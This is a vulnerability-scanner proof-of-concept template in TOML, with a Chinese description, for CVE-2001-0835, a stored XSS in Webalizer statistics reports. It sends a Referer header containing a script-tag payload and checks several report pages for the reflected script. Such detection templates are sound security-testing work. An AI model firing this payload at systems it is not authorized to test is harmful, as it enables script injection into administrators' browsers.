[info]
author = "ave"
description = "检测 Webalizer 2.01-06 统计报告页面中的 Referer 头 XSS 注入漏洞。攻击者可通过发送包含恶意脚本的 Referer 头，在管理员查看统计报告时触发 XSS。"
id = "POC-AVE-2001-0322"
name = "CVE-2001-0835 Webalizer XSS PoC"
severity = "high"
tags = ["ave-2001-0322"]
vuln_id = [
    "CVE-2001-0835",
    "AVE-2001-0322",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/"
protocol = "http"

[poc.requests.headers]
Referer = "https://example.com/search?q=<script>alert('XSS-CVE-2001-0835')</script>"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    301,
    302,
    404,
]
type = "status"

[[poc.requests]]
method = "GET"
path = "/usage/index.html"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<script>alert('XSS-CVE-2001-0835')</script>"]

[[poc.requests]]
method = "GET"
path = "/webalizer/index.html"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<script>alert('XSS-CVE-2001-0835')</script>"]

[[poc.requests]]
method = "GET"
path = "/webalizer/usage_202401.html"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<script>alert('XSS-CVE-2001-0835')</script>"]
